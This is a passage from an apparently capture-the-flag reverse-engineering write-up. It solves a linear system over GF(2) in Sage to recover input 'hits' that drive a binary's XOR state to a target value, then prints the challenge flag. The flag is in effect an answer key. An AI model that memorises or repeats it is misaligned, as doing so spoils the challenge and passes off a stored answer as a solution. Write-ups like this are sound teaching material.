The construction of the matrix with all the XOR state transitions would look like this in Sage:
```py
A = matrix(F, NB, T)
for n in range(T):
    idx = n % N
    val = (n*27 + 55) & 0xff
    u = vector(F, NB)
    for bit in range(8):
        if (val >> bit) & 1:
            u[idx*8 + bit] = 1
    c = M^(T-n) * u
    A.set_column(n, c)
```

So now all we have to do is to solve for $\text{hits[n]}$, which we can do with the magical `solve_right` function in Sage.

```py
# initial state, from earlier
S_0 = bytes.fromhex("C9DFBCF62A54FE2C963234B556A127F8...") # truncated
# final state, DAT_140077660, copied from the binary
S_n = bytes([ 0x14, 0x64, 0x42, 0x4a, 0x00, 0xcc, 0x14, 0x34 ... ])  # truncated
S_0 = bytes_to_vec(S_0)
S_n = bytes_to_vec(S_n)
b = S_n + (M^T)*S_0

hits = A.solve_right(b)
```

We compile our `hits` vector into a `replay.txt`, send it to the netcat and get our flag!

Flag: `osu{e5ed275c44694a8f9688065ff540e1057dfbc948}`